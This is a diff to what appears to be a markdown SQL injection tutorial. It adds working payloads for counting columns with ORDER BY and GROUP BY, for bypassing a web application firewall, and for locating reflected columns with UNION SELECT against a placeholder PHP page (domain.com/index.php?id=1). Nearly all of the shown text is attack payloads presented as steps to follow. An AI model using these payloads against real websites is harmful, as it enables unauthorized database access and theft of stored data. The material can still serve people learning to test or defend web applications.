@@ -83,6 +83,7 @@ This query musn't shows up error, since there is no lower number than 1
 ```http://domain.com/index.php?id=1' order/**_**/by 1-- -```  
 ```http://domain.com/index.php?id=1\ order by 1-- -```  
 ```http://domain.com/index.php?id=1' order by 1 asc-- -```  
+```http://domain.com/index.php?id=1' group by 1 asc-- -```  
     
     - If none of the payloads didn't bypass WAF, try again the payloads by following the 2 rules below:
       - Add a minus (-) before 1 (example: ```?id=-1' /**/ORDER/**/BY/**/ 1-- -```)  
@@ -100,12 +101,19 @@ This means there are only 4 columns. Now we have to find which one of these 4 co
 
 ## Find the vulnerable column where information are stored using 'UNION SELECT' query  
 
-Using a simple query, we determine which of the 4 columns reflect our input using. Only 1 of these 4 payloads will run without **syntax error**:  
+Using a simple query, we determine which of the 4 columns reflect our input using. Only 1 of these payloads will run without **syntax error**. *NOTE: If none worked, try the same payloads, but remove the quote (') after number 1.*    
 
 ```http://domain.com/index.php?id=1' Union Select 1,2,3,4-- -```
 ```http://domain.com/index.php?id=-1 Union Select 1,2,3,4-- -```  
 ```http://domain.com/index.php?id=-1' Union Select 1,2,3,4-- -```
-```http://domain.com/index.php?id=1' Union Select 1,2,3,4-- -```  
+```http://domain.com/index.php?id=1'+UNION+ALL+SELECT+null,null,null,null--+-```  
+```http://domain.com/index.php?id=1' Union Select null,2,3,4-- -```  
+```http://domain.com/index.php?id=1' Union Select 1,null,3,4-- -```  
+```http://domain.com/index.php?id=1' Union Select 1,2,null,4-- -```  
+```http://domain.com/index.php?id=1' Union Select 1,2,3,null-- -```  
+```http://domain.com/index.php?id=.1' Union Select 1,2,3,4-- -```  
+```http://domain.com/index.php?id=-1' div 0' Union Select 1,2,3,4-- -```  
+```http://domain.com/index.php?id=1' Union Select 1,2,3,4 desc-- -```  
 
 Website must successfully load and we will see a number (in our case between 1-4)  
 
